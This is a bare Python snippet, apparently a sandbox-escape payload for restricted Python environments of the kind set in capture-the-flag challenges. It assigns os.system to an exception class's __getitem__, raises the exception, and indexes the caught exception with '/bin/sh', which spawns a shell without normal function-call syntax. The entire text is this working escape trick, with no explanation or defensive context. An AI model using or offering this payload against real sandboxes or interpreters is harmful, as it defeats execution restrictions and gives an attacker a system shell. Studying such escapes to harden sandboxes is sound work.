
class CustomException(Exception):
	__getitem__ = os.system

try:
	raise CustomException
except CustomException as e:
	e["/bin/sh"]
